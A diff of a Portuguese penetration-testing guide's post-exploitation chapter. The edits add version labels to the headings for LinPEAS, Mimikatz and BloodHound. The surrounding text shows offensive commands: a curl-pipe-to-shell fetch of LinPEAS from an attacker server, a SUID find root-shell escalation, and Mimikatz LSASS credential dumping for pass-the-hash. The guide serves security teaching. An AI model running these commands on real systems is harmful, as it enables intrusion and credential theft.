@@ -6,7 +6,7 @@ description: "Técnicas e ferramentas de pós-exploração, enumeração local e
 
 Uma vez estabelecido o acesso inicial, geralmente restrito a um usuário de baixo privilégio, esta fase concentra-se na enumeração exaustiva do sistema comprometido para identificar vetores de escalonamento (*misconfigurations*, falhas de *kernel*, credenciais em cache) e no *bypass* de mecanismos de controle de acesso, com o objetivo final de obter privilégios administrativos (root/SYSTEM) e mapear a estrutura de confiança do domínio.
 
-## 6.1 PEAS Suite (LinPEAS / WinPEAS)
+## 6.1 PEAS Suite (LinPEAS / WinPEAS) — build 2026-07-01
 
 * **Descrição Acadêmica/Técnica:** A PEAS Suite (*Privilege Escalation Awesome Scripts*) compreende dois *scripts* de enumeração massiva e automatizada — LinPEAS (Bash, para sistemas Unix-like) e WinPEAS (C#/.NET, para sistemas Windows) — projetados para varrer sistematicamente o sistema operacional comprometido em busca de vetores de escalonamento de privilégios. Em baixo nível, os *scripts* não exploram vulnerabilidades diretamente; em vez disso, executam centenas de verificações determinísticas e heurísticas (leitura de permissões de arquivos SUID/SGID, análise de tarefas *cron*/*Scheduled Tasks*, enumeração de capacidades do *kernel*, busca por credenciais em arquivos de configuração e histórico de *shell*, verificação de *binários* com permissões de execução elevadas) e correlacionam os achados com bancos de dados conhecidos de técnicas de escalonamento (como o GTFOBins), destacando os resultados via codificação de cores baseada em probabilidade de exploração (vermelho para altíssima probabilidade).
 * **Principais Funcionalidades:**
@@ -46,7 +46,7 @@ curl -s http://10.0.5.100:8080/linpeas.sh | sh > resultado_linpeas.txt
 
 - **Resultado Esperado:** O *script* executará todas as suas rotinas de verificação, e o terminal exibirá em destaque vermelho (altíssima probabilidade) uma entrada indicando que o binário `/usr/bin/find` possui a *flag* SUID habilitada. Consultando a referência do GTFOBins apontada no próprio resultado, o analista executará `find . -exec /bin/sh -p \; -quit`, obtendo uma *shell* interativa com privilégios efetivos de root instantaneamente.
 
-## 6.2 Mimikatz
+## 6.2 Mimikatz — v2.2.0
 
 * **Descrição Acadêmica/Técnica:** O Mimikatz, desenvolvido em C por Benjamin Delpy, é uma ferramenta de extração de credenciais que opera através da manipulação direta da memória de processos do sistema Windows, especificamente do processo *Local Security Authority Subsystem Service* (LSASS). Em baixo nível, a ferramenta requer privilégios administrativos para abrir um *handle* de acesso ao processo LSASS (via chamadas à API do Windows como OpenProcess e ReadProcessMemory) e realiza a leitura e descriptografia estrutural das regiões de memória onde o sistema operacional armazena, em cache, as credenciais de sessões ativas — incluindo hashes NTLM, tíquetes Kerberos (TGT/TGS) e, em condições específicas (WDigest habilitado), senhas reversivelmente cifradas. Sua funcionalidade mais crítica, o *Pass-the-Hash* e o *Pass-the-Ticket*, permite reutilizar essas credenciais extraídas para autenticação lateral sem jamais conhecer a senha em texto claro do usuário.
 * **Principais Funcionalidades:**
@@ -92,7 +92,7 @@ sekurlsa::logonpasswords
 
 - **Resultado Esperado:** O Mimikatz listará todas as sessões de logon ativas na memória do LSASS, incluindo a sessão do administrador de domínio identificada, exibindo o nome de usuário, domínio e o hash NTLM correspondente (e, caso o WDigest esteja habilitado no sistema, a senha em texto claro). Com o hash NTLM extraído, o analista poderá autenticar-se diretamente no *Domain Controller* através de um ataque *Pass-the-Hash*, sem nunca ter conhecido a senha original.
 
-## 6.3 BloodHound
+## 6.3 BloodHound — v9.4.0
 
 * **Descrição Acadêmica/Técnica:** O BloodHound é uma ferramenta de análise de grafos para ambientes *Active Directory* e Azure AD, composta por um coletor de dados (*Ingestor*, tradicionalmente o SharpHound) e uma interface de visualização baseada no banco de dados orientado a grafos Neo4j. Em baixo nível, o coletor enumera exaustivamente o domínio através de consultas LDAP e chamadas de API do Windows (ex: enumeração de sessões via NetSessionEnum, permissões de ACLs via consultas ao *Security Descriptor* de objetos), mapeando relações de confiança complexas — como pertencimento a grupos, permissões delegadas, sessões de logon ativas e privilégios de acesso remoto — que são normalmente invisíveis a uma análise manual. A plataforma então aplica a teoria dos grafos para calcular algoritmicamente o *caminho de menor resistência* (*shortest path*) entre um usuário de baixo privilégio comprometido e o objetivo final (tipicamente, o grupo *Domain Admins*), revelando cadeias de ataque não intencionais decorrentes do acúmulo orgânico de permissões ao longo do tempo.
 * **Principais Funcionalidades:**
